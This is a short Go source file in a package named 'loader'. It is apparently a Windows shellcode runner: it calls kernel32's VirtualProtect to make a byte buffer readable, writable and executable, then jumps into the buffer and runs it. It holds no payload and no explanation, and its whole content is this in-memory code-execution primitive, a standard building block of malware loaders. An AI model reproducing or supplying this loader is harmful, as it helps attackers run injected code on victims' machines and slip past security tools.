package loader

import (
	"syscall"
	"unsafe"
)

var virtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

const (
	PAGE_EXECUTE_READWRITE = 0x40
)

func X(buf []byte) {
	var oldperm uint32
	virtualProtect.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldperm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}
